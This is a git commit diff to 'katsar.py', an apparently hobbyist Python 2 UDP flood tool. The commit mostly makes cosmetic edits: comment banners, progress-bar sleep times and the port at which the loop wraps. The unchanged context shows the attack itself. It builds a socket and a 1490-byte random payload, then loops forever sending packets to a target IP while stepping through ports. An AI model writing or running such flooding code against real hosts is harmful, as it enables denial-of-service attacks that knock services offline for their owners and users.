4b7b9638bef6a39e2d135b73a5048df860d47693
natso500 <49106380+natso500@users.noreply.github.com>
2019-05-24 13:57:09 +0300

    Update katsar.py

--- katsar.py
+++ katsar.py
@@ -3,22 +3,14 @@ import os
 import time
 import socket
 import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-############clear############
+############color############
 R = '\033[31;1m'
 G = '\033[32;1m'
 Y = '\033[38;1m'
-##############
+##############NatSo###########
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
+#############NatSo############
 print R
 os.system("clear")
 os.system("figlet CUUT_ALL")
@@ -34,13 +26,13 @@ print G
 os.system("clear")
 os.system("figlet Starting")
 print "[                    ] 0% "
-time.sleep(5)
+time.sleep(3)
 print "[=====               ] 25%"
-time.sleep(5)
+time.sleep(4)
 print "[==========          ] 50%"
 time.sleep(5)
 print "[===============     ] 75%"
-time.sleep(5)
+time.sleep(6)
 print "[====================] 100%"
 time.sleep(3)
 sent = 0
@@ -48,6 +40,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s cut to %s and cut port:%s"%(sent,ip,port)
-     if port == 65534:
+     print "Sent %s cut to %s and opne port:%s"%(sent,ip,port)
+     if port == 5000:
        port = 1            
